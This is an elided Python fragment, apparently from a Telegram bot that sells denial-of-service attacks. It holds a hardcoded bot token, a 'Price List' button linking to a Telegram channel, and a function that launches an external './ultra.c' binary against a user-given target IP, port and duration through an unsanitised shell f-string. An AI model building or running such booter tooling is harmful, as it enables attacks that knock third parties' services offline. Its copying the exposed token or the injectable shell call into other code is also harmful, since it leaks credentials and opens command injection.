...
TOKEN = '8774747361:AAHUiaq1HD71Vzd1UCJBPJd37UGTuUTyW0s'
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./ultra.c {target_ip} {target_port} {duration} 100")
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/c/3661090730/2632")
            markup.add(button1)
            markup.add(button2)
        else:
